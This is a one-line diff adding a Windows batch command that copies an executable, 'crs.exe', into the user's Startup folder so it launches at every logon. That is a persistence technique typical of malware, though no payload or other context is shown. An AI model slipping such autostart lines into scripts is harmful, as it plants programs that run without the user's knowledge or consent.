@@ -1,0 +1,1 @@
+copy /y "crs.exe", "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
